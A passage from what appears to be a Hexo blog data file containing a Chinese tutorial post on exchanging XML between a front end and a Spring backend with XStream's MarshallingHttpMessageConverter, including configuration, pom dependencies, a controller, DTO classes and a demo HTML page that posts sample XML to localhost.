}\n}\n</script>\n</head>\n<body>\n\n<p id=\"p1\">\nThe getResponseHeader() function returns a header from a resource.\nHeaders contain file information like length,\nserver-type, content-type, date-modified, etc.</p>\n\n<button onclick=\"loadXMLDoc('http://localhost:8080/valida/webctrl/demo/txml')\">Get \"Last-Modified\"</button>\n\n</body>\n</html>\n```\n\n\n\n另外一种使用jackson实现xml数据交换的配置，详见另一篇博客\n\n[spring基于xml格式数据交换的前后端配置与使用之Jackson方式](./2017-08-18_spring_xml_jackson.md)","source":"_posts/2017-08-18_spring_xml_xstream.md","raw":"---\ntitle: spring基于xml格式数据交换的前后端配置与使用之xstream方式\ndate: 2017-08-18 18:07:42\ntags: spring\npermalink: spring-xml-xstream\nkeywords: spring, xml, MarshallingHttpMessageConverter \nrId: MB-17081801\n---\n\nMarshallingHttpMessageConverter 方式解析xml（支持注解修改元素别名）配置及代码如下：\n\nxml配置文件中添加converter\n\n```\n<bean class=\"org.springframework.http.converter.xml.MarshallingHttpMessageConverter\">\n\t\t        <constructor-arg>\n\t\t        \t<bean class=\"org.springframework.oxm.xstream.XStreamMarshaller\">\n\t\t\t\t        <property name=\"streamDriver\">\n\t\t\t\t            <bean class=\"com.thoughtworks.xstream.io.xml.StaxDriver\"/>\n\t\t\t\t        </property>\n\t\t\t\t        <property name=\"annotatedClasses\">\n\t\t\t\t            <list>\n\t\t\t\t                <value>com.mufeng.dto.in.Xml</value>\n\t\t\t\t                <value>com.mufeng.dto.out.TestDtoOut</value>\n\t\t\t\t            </list>\n\t\t\t\t        </property>\n\t\t\t\t    </bean>\n\t\t\t\t    \n\t\t        </constructor-arg>\n\t\t        <property name=\"supportedMediaTypes\">\n                \t<list>\n                \t\t<value>application/xml;charset=UTF-8</value>\n                \t\t<value>text/xml;charset=UTF-8</value>\n                \t\t<value>text/html;charset=UTF-8</value>\n                \t</list>\n                </property>\n\t\t\t</bean>\n\n```\n\npom文件\n\n\n```\n<!-- xstream xml start -->\n\t\t<dependency>\n\t\t\t<groupId>com.thoughtworks.xstream</groupId>\n\t\t\t<artifactId>xstream</artifactId>\n\t\t\t<version>1.4.10</version>\n\t\t</dependency>\n\n\t\t<dependency>\n\t\t\t<groupId>org.springframework</groupId>\n\t\t\t<artifactId>spring-oxm</artifactId>\n\t\t\t<version>4.3.7.RELEASE</version>\n\t\t</dependency>\n\t\t<!-- xstream xml end -->\n```\n\ncontroller文件\n\n```\n@RequestMapping(value = \"txml\", headers={\"content-type=application/xml\"})\n\tpublic Object testXml(@RequestBody Xml xml/*, HttpServletRequest req*/) {\n                // 这部分主要打印看看，验证request xml方式入参成功\n\t\ttry {\n\t\t\tObjectMapper mapper = new ObjectMapper();\n\t\t\tmapper.disable(DeserializationFeature.FAIL_ON_UNKNOWN_PROPERTIES)\n\t\t\t\t\t.enable(JsonGenerator.Feature.IGNORE_UNKNOWN).enable(JsonParser.Feature.ALLOW_UNQUOTED_FIELD_NAMES);\n\t\t\tSystem.out.println(mapper.writeValueAsString(xml));// 打印入参数据可以看到成功入参\n\t\t} catch (JsonProcessingException e) {\n\t\t\te.printStackTrace();\n\t\t}\n\n                // response出参数据\n\t\tTestDtoOut tdo = new TestDtoOut();\n\t\ttdo.code = 200;\n\t\ttdo.msg = \"\";//xml.getToUserName();\n\t\treturn tdo;\n\t}\n\n```\n两个出入参dto（只截部分代码）\n\n```\npackage com.mufeng.dto.in;\n\nimport com.thoughtworks.xstream.annotations.XStreamAlias;\n\n@XStreamAlias(value=\"xml\")// 给根节点别名，不然标签名会带上包名\npublic class Xml {\n\t@XStreamAlias(value=\"ToUserName\")// 给属性别名，可以使实现xml标签名与属性名不同的需求\n\tString toUserName;\n\tString FromUserName;// 不给别名，默认标签名与属性名一致\n\tLong CreateTime;\n\tString MsgType;\n\tLong MsgId;\n\tString Content;\n```\n```\npackage com.mufeng.dto.out;\n\nimport com.thoughtworks.xstream.annotations.XStreamAlias;\n\n@XStreamAlias(value=\"testDtoOut\")\npublic class TestDtoOut {\n\n\tpublic Integer code;\n\tpublic String msg;\n```\n\n\n前端文件html\n\n```\n<html>\n<head>\n<script type=\"text/javascript\">\n  var xmlData = \"<xml><ToUserName><![CDATA[toUser]]></ToUserName><FromUserName><![CDATA[fromUser]]></FromUserName><CreateTime>1348831860</CreateTime><MsgType><![CDATA[text]]></MsgType><Content><![CDATA[this is a test]]></Content><MsgId>1234567890123456</MsgId></xml>\";\n\nvar xmlhttp;\nfunction loadXMLDoc(url)\n{\nxmlhttp=null;\nif (window.XMLHttpRequest)\n  {// all modern browsers\n  xmlhttp=new XMLHttpRequest();\n  }\nelse if (window.ActiveXObject)\n  {// for IE5, IE6\n  xmlhttp=new ActiveXObject(\"Microsoft.XMLHTTP\");\n  }\nif (xmlhttp!=null)\n  {\n  xmlhttp.onreadystatechange=state_Change;\n  xmlhttp.open(\"POST\",url,true);\n  xmlhttp.setRequestHeader(\"Accept\",\"application/xml\"); \n  xmlhttp.setRequestHeader(\"Content-Type\",\"application/xml\"); \n  xmlhttp.send(xmlData);\n  }\nelse\n  {\n  alert(\"Your browser does not support XMLHTTP.\");\n  }\n}\n\nfunction state_Change()\n{\nif (xmlhttp.readyState==4)\n  {// 4 = \"loaded\"\n  if (xmlhttp.status==200)\n    {// 200 = \"OK\"\n    document.getElementById('p1').innerHTML=\"This file was last modified on: \" + xmlhttp.getResponseHeader('Last-Modified');\n    }\n  else\n    {\n    alert(\"Problem retrieving data:\" + xmlhttp.statusText);\n    }\n  }\n}\n</script>\n</head>\n<body>\n\n<p id=\"p1\">\nThe getResponseHeader() function returns a header from a resource.\nHeaders contain file information like length,\nserver-type, content-type, date-modified, etc.</p>\n\n<button onclick=\"loadXMLDoc('http://localhost:8080/valida/webctrl/demo/txml')\">Get \"Last-Modified\"</button>\n\n</body>\n</html>\n```\n\n\n\n另外一种使用jackson实现xml数据交换的配置，详见另一篇博客\n\n[spring基于xml格式数据交换的前后端配置与使用之Jackson方式](./2017-08-18_spring_xml_jackson.md)","slug":"spring-xml-xstream","published":1,"updated":"2020-01-23T08:21:31.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck5qhi05e000bg0ukli08b7sj","content":"<p>MarshallingHttpMessageConverter 方式解析xml（支持注解修改元素别名）配置及代码如下：</p>\n<p>xml配置文件中添加converter</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;bean class=&quot;org.springframework.http.converter.xml.MarshallingHttpMessageConverter&quot;&gt;</span><br><span class=\"line\">\t\t        &lt;constructor-arg&gt;</span><br><span class=\"line\">\t\t        \t&lt;bean class=&quot;org.springframework.oxm.xstream.XStreamMarshaller&quot;&gt;</span><br><span class=\"line\">\t\t\t\t        &lt;property name=&quot;streamDriver&quot;&gt;</span><br><span class=\"line\">\t\t\t\t            &lt;bean class=&quot;com.thoughtworks.xstream.io.xml.StaxDriver&quot;/&gt;</span><br><span class=\"line\">\t\t\t\t        &lt;/property&gt;</span><br><span class=\"line\">\t\t\t\t        &lt;property name=&quot;annotatedClasses&quot;&gt;</span><br><span class=\"line\">\t\t\t\t            &lt;list&gt;</span><br><span class=\"line\">\t\t\t\t                &lt;value&gt;com.mufeng.dto.in.Xml&lt;/value&gt;</span><br><span class=\"line\">\t\t\t\t                &lt;value&gt;com.mufeng.dto.out.TestDtoOut&lt;/value&gt;</span><br><span class=\"line\">\t\t\t\t            &lt;/list&gt;</span><br><span class=\"line\">\t\t\t\t        &lt;/property&gt;</span><br><span class=\"line\">\t\t\t\t    &lt;/bean&gt;</span><br><span class=\"line\">\t\t\t\t    </span><br><span class=\"line\">\t\t        &lt;/constructor-arg&gt;</span><br><span class=\"line\">\t\t        &lt;property name=&quot;supportedMediaTypes&quot;&gt;</span><br><span class=\"line\">                \t&lt;list&gt;</span><br><span class=\"line\">                \t\t&lt;value&gt;application/xml;charset=UTF-8&lt;/value&gt;</span><br><span class=\"line\">                \t\t&lt;value&gt;text/xml;charset=UTF-8&lt;/value&gt;</span><br><span class=\"line\">                \t\t&lt;value&gt;text/html;charset=UTF-8&lt;/value&gt;</span><br><span class=\"line\">                \t&lt;/list&gt;</span><br><span class=\"line\">                &lt;/property&gt;</span><br><span class=\"line\">\t\t\t&lt;/bean&gt;</span><br></pre></td></tr></table></figure>\n\n<p>pom文件</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!-- xstream xml start --&gt;</span><br><span class=\"line\">\t\t&lt;dependency&gt;</span><br><span class=\"line\">\t\t\t&lt;groupId&gt;com.thoughtworks.xstream&lt;/groupId&gt;</span><br><span class=\"line\">\t\t\t&lt;artifactId&gt;xstream&lt;/artifactId&gt;</span><br><span class=\"line\">\t\t\t&lt;version&gt;1.4.10&lt;/version&gt;</span><br><span class=\"line\">\t\t&lt;/dependency&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t&lt;dependency&gt;</span><br><span class=\"line\">\t\t\t&lt;groupId&gt;org.springframework&lt;/groupId&gt;</span><br><span class=\"line\">\t\t\t&lt;artifactId&gt;spring-oxm&lt;/artifactId&gt;</span><br><span class=\"line\">\t\t\t&lt;version&gt;4.3.7.RELEASE&lt;/version&gt;</span><br><span class=\"line\">\t\t&lt;/dependency&gt;</span><br><span class=\"line\">\t\t&lt;!-- xstream xml end --&gt;</span><br></pre></td></tr></table></figure>\n\n<p>controller文件</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">@RequestMapping(value = &quot;txml&quot;, headers=&#123;&quot;content-type=application/xml&quot;&#125;)</span><br><span class=\"line\">\tpublic Object testXml(@RequestBody Xml xml/*, HttpServletRequest req*/) &#123;</span><br><span class=\"line\">                // 这部分主要打印看看，验证request xml方式入参成功</span><br><span class=\"line\">\t\ttry &#123;</span><br><span class=\"line\">\t\t\tObjectMapper mapper = new ObjectMapper();</span><br><span class=\"line\">\t\t\tmapper.disable(DeserializationFeature.FAIL_ON_UNKNOWN_PROPERTIES)</span><br><span class=\"line\">\t\t\t\t\t.enable(JsonGenerator.Feature.IGNORE_UNKNOWN).enable(JsonParser.Feature.ALLOW_UNQUOTED_FIELD_NAMES);</span><br><span class=\"line\">\t\t\tSystem.out.println(mapper.writeValueAsString(xml));// 打印入参数据可以看到成功入参</span><br><span class=\"line\">\t\t&#125; catch (JsonProcessingException e) &#123;</span><br><span class=\"line\">\t\t\te.printStackTrace();</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">                // response出参数据</span><br><span class=\"line\">\t\tTestDtoOut tdo = new TestDtoOut();</span><br><span class=\"line\">\t\ttdo.code = 200;</span><br><span class=\"line\">\t\ttdo.msg = &quot;&quot;;//xml.getToUserName();</span><br><span class=\"line\">\t\treturn tdo;</span><br><span class=\"line\">\t&#125;</span><br></pre></td></tr></table></figure>\n\n<p>两个出入参dto（只截部分代码）</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">package com.mufeng.dto.in;</span><br><span class=\"line\"></span><br><span class=\"line\">import com.thoughtworks.xstream.annotations.XStreamAlias;</span><br><span class=\"line\"></span><br><span class=\"line\">@XStreamAlias(value=&quot;xml&quot;)// 给根节点别名，不然标签名会带上包名</span><br><span class=\"line\">public class Xml &#123;</span><br><span class=\"line\">\t@XStreamAlias(value=&quot;ToUserName&quot;)// 给属性别名，可以使实现xml标签名与属性名不同的需求</span><br><span class=\"line\">\tString toUserName;</span><br><span class=\"line\">\tString FromUserName;// 不给别名，默认标签名与属性名一致</span><br><span class=\"line\">\tLong CreateTime;</span><br><span class=\"line\">\tString MsgType;</span><br><span class=\"line\">\tLong MsgId;</span><br><span class=\"line\">\tString Content;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">package com.mufeng.dto.out;</span><br><span class=\"line\"></span><br><span class=\"line\">import com.thoughtworks.xstream.annotations.XStreamAlias;</span><br><span class=\"line\"></span><br><span class=\"line\">@XStreamAlias(value=&quot;testDtoOut&quot;)</span><br><span class=\"line\">public class TestDtoOut &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">\tpublic Integer code;</span><br><span class=\"line\">\tpublic String msg;</span><br></pre></td></tr></table></figure>\n\n<p>前端文件html</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;html&gt;</span><br><span class=\"line\">&lt;head&gt;</span><br><span class=\"line\">&lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class=\"line\">  var xmlData = &quot;&lt;xml&gt;&lt;ToUserName&gt;&lt;![CDATA[toUser]]&gt;&lt;/ToUserName&gt;&lt;FromUserName&gt;&lt;![CDATA[fromUser]]&gt;&lt;/FromUserName&gt;&lt;CreateTime&gt;1348831860&lt;/CreateTime&gt;&lt;MsgType&gt;&lt;![CDATA[text]]&gt;&lt;/MsgType&gt;&lt;Content&gt;&lt;![CDATA[this is a test]]&gt;&lt;/Content&gt;&lt;MsgId&gt;1234567890123456&lt;/MsgId&gt;&lt;/xml&gt;&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">var xmlhttp;</span><br><span class=\"line\">function loadXMLDoc(url)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">xmlhttp=null;</span><br><span class=\"line\">if (window.XMLHttpRequest)</span><br><span class=\"line\">  &#123;// all modern browsers</span><br><span class=\"line\">  xmlhttp=new XMLHttpRequest();</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">else if (window.ActiveXObject)</span><br><span class=\"line\">  &#123;// for IE5, IE6</span><br><span class=\"line\">  xmlhttp=new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">if (xmlhttp!=null)</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">  xmlhttp.onreadystatechange=state_Change;</span><br><span class=\"line\">  xmlhttp.open(&quot;POST&quot;,url,true);</span><br><span class=\"line\">  xmlhttp.setRequestHeader(&quot;Accept&quot;,&quot;application/xml&quot;); </span><br><span class=\"line\">  xmlhttp.setRequestHeader(&quot;Content-Type&quot;,&quot;application/xml&quot;); </span><br><span class=\"line\">  xmlhttp.send(xmlData);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">else</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">  alert(&quot;Your browser does not support XMLHTTP.&quot;);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">function state_Change()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">if (xmlhttp.readyState==4)</span><br><span class=\"line\">  &#123;// 4 = &quot;loaded&quot;</span><br><span class=\"line\">  if (xmlhttp.status==200)</span><br><span class=\"line\">    &#123;// 200 = &quot;OK&quot;</span><br><span class=\"line\">    document.getElementById(&apos;p1&apos;).innerHTML=&quot;This file was last modified on: &quot; + xmlhttp.getResponseHeader(&apos;Last-Modified&apos;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  else</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">    alert(&quot;Problem retrieving data:&quot; + xmlhttp.statusText);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">&lt;/script&gt;</span><br><span class=\"line\">&lt;/head&gt;</span><br><span class=\"line\">&lt;body&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;p id=&quot;p1&quot;&gt;</span><br><span class=\"line\">The getResponseHeader() function returns a header from a resource.</span><br><span class=\"line\">Headers contain file information like length,</span><br><span class=\"line\">server-type, content-type, date-modified, etc.&lt;/p&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;button onclick=&quot;loadXMLDoc(&apos;http://localhost:8080/valida/webctrl/demo/txml&apos;)&quot;&gt;Get &quot;Last-Modified&quot;&lt;/button&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;/body&gt;</span><br><span class=\"line\">&lt;/html&gt;</span><br></pre></td></tr></table></figure>\n\n<p>另外一种使用jackson实现xml数据交换的配置，详见另一篇博客</p>\n<p><a href=\"./2017-08-18_spring_xml_jackson.md\">spring基于xml格式数据交换的前后端配置与使用之Jackson方式</a></p>\n","site":{"data":{}},"excerpt":"","more":"<p>MarshallingHttpMessageConverter 方式解析xml（支持注解修改元素别名）配置及代码如下：</p>\n<p>xml配置文件中添加converter</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;bean class=&quot;org.springframework.http.converter.xml.MarshallingHttpMessageConverter&quot;&gt;</span><br><span class=\"line\">\t\t        &lt;constructor-arg&gt;</span><br><span class=\"line\">\t\t        \t&lt;bean class=&quot;org.springframework.oxm.xstream.XStreamMarshaller&quot;&gt;</span><br><span class=\"line\">\t\t\t\t        &lt;property name=&quot;streamDriver&quot;&gt;</span><br><span class=\"line\">\t\t\t\t            &lt;bean class=&quot;com.thoughtworks.xstream.io.xml.StaxDriver&quot;/&gt;</span><br><span class=\"line\">\t\t\t\t        &lt;/property&gt;</span><br><span class=\"line\">\t\t\t\t        &lt;property name=&quot;annotatedClasses&quot;&gt;</span><br><span class=\"line\">\t\t\t\t            &lt;list&gt;</span><br><span class=\"line\">\t\t\t\t                &lt;value&gt;com.mufeng.dto.in.Xml&lt;/value&gt;</span><br><span class=\"line\">\t\t\t\t                &lt;value&gt;com.mufeng.dto.out.TestDtoOut&lt;/value&gt;</span><br><span class=\"line\">\t\t\t\t            &lt;/list&gt;</span><br><span class=\"line\">\t\t\t\t        &lt;/property&gt;</span><br><span class=\"line\">\t\t\t\t    &lt;/bean&gt;</span><br><span class=\"line\">\t\t\t\t    </span><br><span class=\"line\">\t\t        &lt;/constructor-arg&gt;</span><br><span class=\"line\">\t\t        &lt;property name=&quot;supportedMediaTypes&quot;&gt;</span><br><span class=\"line\">                \t&lt;list&gt;</span><br><span class=\"line\">                \t\t&lt;value&gt;application/xml;charset=UTF-8&lt;/value&gt;</span><br><span class=\"line\">                \t\t&lt;value&gt;text/xml;charset=UTF-8&lt;/value&gt;</span><br><span class=\"line\">                \t\t&lt;value&gt;text/html;charset=UTF-8&lt;/value&gt;</span><br><span class=\"line\">                \t&lt;/list&gt;</span><br><span class=\"line\">                &lt;/property&gt;</span><br><span class=\"line\">\t\t\t&lt;/bean&gt;</span><br></pre></td></tr></table></figure>\n\n<p>pom文件</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!-- xstream xml start --&gt;</span><br><span class=\"line\">\t\t&lt;dependency&gt;</span><br><span class=\"line\">\t\t\t&lt;groupId&gt;com.thoughtworks.xstream&lt;/groupId&gt;</span><br><span class=\"line\">\t\t\t&lt;artifactId&gt;xstream&lt;/artifactId&gt;</span><br><span class=\"line\">\t\t\t&lt;version&gt;1.4.10&lt;/version&gt;</span><br><span class=\"line\">\t\t&lt;/dependency&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t&lt;dependency&gt;</span><br><span class=\"line\">\t\t\t&lt;groupId&gt;org.springframework&lt;/groupId&gt;</span><br><span class=\"line\">\t\t\t&lt;artifactId&gt;spring-oxm&lt;/artifactId&gt;</span><br><span class=\"line\">\t\t\t&lt;version&gt;4.3.7.RELEASE&lt;/version&gt;</span><br><span class=\"line\">\t\t&lt;/dependency&gt;</span><br><span class=\"line\">\t\t&lt;!-- xstream xml end --&gt;</span><br></pre></td></tr></table></figure>\n\n<p>controller文件</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">@RequestMapping(value = &quot;txml&quot;, headers=&#123;&quot;content-type=application/xml&quot;&#125;)</span><br><span class=\"line\">\tpublic Object testXml(@RequestBody Xml xml/*, HttpServletRequest req*/) &#123;</span><br><span class=\"line\">                // 这部分主要打印看看，验证request xml方式入参成功</span><br><span class=\"line\">\t\ttry &#123;</span><br><span class=\"line\">\t\t\tObjectMapper mapper = new ObjectMapper();</span><br><span class=\"line\">\t\t\tmapper.disable(DeserializationFeature.FAIL_ON_UNKNOWN_PROPERTIES)</span><br><span class=\"line\">\t\t\t\t\t.enable(JsonGenerator.Feature.IGNORE_UNKNOWN).enable(JsonParser.Feature.ALLOW_UNQUOTED_FIELD_NAMES);</span><br><span class=\"line\">\t\t\tSystem.out.println(mapper.writeValueAsString(xml));// 打印入参数据可以看到成功入参</span><br><span class=\"line\">\t\t&#125; catch (JsonProcessingException e) &#123;</span><br><span class=\"line\">\t\t\te.printStackTrace();</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">                // response出参数据</span><br><span class=\"line\">\t\tTestDtoOut tdo = new TestDtoOut();</span><br><span class=\"line\">\t\ttdo.code = 200;</span><br><span class=\"line\">\t\ttdo.msg = &quot;&quot;;//xml.getToUserName();</span><br><span class=\"line\">\t\treturn tdo;</span><br><span class=\"line\">\t&#125;</span><br></pre></td></tr></table></figure>\n\n<p>两个出入参dto（只截部分代码）</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">package com.mufeng.dto.in;</span><br><span class=\"line\"></span><br><span class=\"line\">import com.thoughtworks.xstream.annotations.XStreamAlias;</span><br><span class=\"line\"></span><br><span class=\"line\">@XStreamAlias(value=&quot;xml&quot;)// 给根节点别名，不然标签名会带上包名</span><br><span class=\"line\">public class Xml &#123;</span><br><span class=\"line\">\t@XStreamAlias(value=&quot;ToUserName&quot;)// 给属性别名，可以使实现xml标签名与属性名不同的需求</span><br><span class=\"line\">\tString toUserName;</span><br><span class=\"line\">\tString FromUserName;// 不给别名，默认标签名与属性名一致</span><br><span class=\"line\">\tLong CreateTime;</span><br><span class=\"line\">\tString MsgType;</span><br><span class=\"line\">\tLong MsgId;</span><br><span class=\"line\">\tString Content;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">package com.mufeng.dto.out;</span><br><span class=\"line\"></span><br><span class=\"line\">import com.thoughtworks.xstream.annotations.XStreamAlias;</span><br><span class=\"line\"></span><br><span class=\"line\">@XStreamAlias(value=&quot;testDtoOut&quot;)</span><br><span class=\"line\">public class TestDtoOut &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">\tpublic Integer code;</span><br><span class=\"line\">\tpublic String msg;</span><br></pre></td></tr></table></figure>\n\n<p>前端文件html</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span 